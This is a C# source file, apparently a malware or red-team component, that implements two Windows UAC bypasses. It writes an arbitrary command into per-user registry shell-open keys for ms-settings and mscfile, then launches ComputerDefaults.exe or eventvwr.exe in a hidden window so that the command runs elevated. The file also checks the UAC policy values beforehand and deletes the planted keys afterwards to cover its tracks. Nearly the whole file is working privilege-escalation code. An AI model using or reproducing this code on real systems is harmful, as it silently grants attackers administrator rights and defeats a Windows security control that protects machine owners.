using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UACBypass
{
    public static class UAC
    {

        /// <summary>
        /// This method checks if Windows UAC can be bypassed.
        /// </summary>
        /// <returns>
        /// Return True if the current configuration of the User Account Control (UAC) allows a privilege escalation.
        /// </returns>
        public static bool CanBypassUAC()
        {
            string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
            string enableLUA = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("EnableLUA").ToString();
            string promptOnSecureDesktop = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("PromptOnSecureDesktop").ToString();

            if (enableLUA != "1") return false;

            if (consentPromptBehaviorAdmin == "2") return false;
            else return true;
        }

        public static bool IsUACDisabled()
        {
            string consentPromptBehaviorAdmin = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue("ConsentPromptBehaviorAdmin").ToString();
      
            if (consentPromptBehaviorAdmin == "0") return true;
            else return false;
        }

        public static void RestartAsAdmin()
        {
            using (Process p = new Process())
            {
                p.StartInfo.FileName = Application.ExecutablePath;
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.Verb = "runas";

                p.Start();

                p.WaitForExit();
            }
        }

        public static void BypassUsingComputerDefaults(string command)
        {
            if (!UAC.CanBypassUAC()) new Exception("Invalid uac configuration");

            //Set the registry key for fodhelper
            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = Environment.SystemDirectory + @"\ComputerDefaults.exe";
            p.Start();
        }

        public static void BypassUsingEventViewer(string command)
        {
            if (!UAC.CanBypassUAC()) new Exception("Invalid uac configuration");

            //Set the registry key for eventvwr
            RegistryKey newkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"mscfile\Shell\Open\command");

            RegistryKey vwr = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
            vwr.SetValue("", @command);
            vwr.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = Environment.SystemDirectory + @"\eventvwr.exe";
            p.Start();
        }

        public static void CleanRegistry()
        {
            try
            {
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("ms-settings");
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true).DeleteSubKeyTree("mscfile");
            }
            catch (Exception) { }
        }
    }
}